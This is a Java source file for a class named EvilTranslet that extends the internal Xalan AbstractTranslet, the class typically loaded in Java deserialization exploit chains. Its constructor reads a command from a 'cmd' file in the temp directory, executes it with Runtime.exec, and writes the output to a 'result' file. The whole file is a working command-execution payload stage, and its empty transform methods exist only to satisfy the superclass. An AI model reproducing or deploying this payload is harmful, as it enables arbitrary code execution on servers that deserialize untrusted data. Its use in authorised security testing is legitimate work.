import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Paths;

public class EvilTranslet extends AbstractTranslet {

  public EvilTranslet() {
    try {
      String tmp = System.getProperty("java.io.tmpdir");
      String inputFile = tmp + File.separator + "cmd";
      String outputFile = tmp + File.separator + "result";
      InputStream inputStream = Runtime
          .getRuntime().exec(new String(Files.readAllBytes(Paths.get(inputFile))).replace("%", "").split(" ")).getInputStream();
      StringBuilder stringBuilder = new StringBuilder();
      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
      String line;
      while((line = bufferedReader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
      }
      if (Files.exists(Paths.get(outputFile)))
        Files.delete(Paths.get(outputFile));
      Files.write(Paths.get(outputFile), stringBuilder.toString().getBytes());
    } catch (Throwable e) {
      e.printStackTrace();
    }
  }

  @Override
  public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

  }

  @Override
  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
      throws TransletException {

  }
}
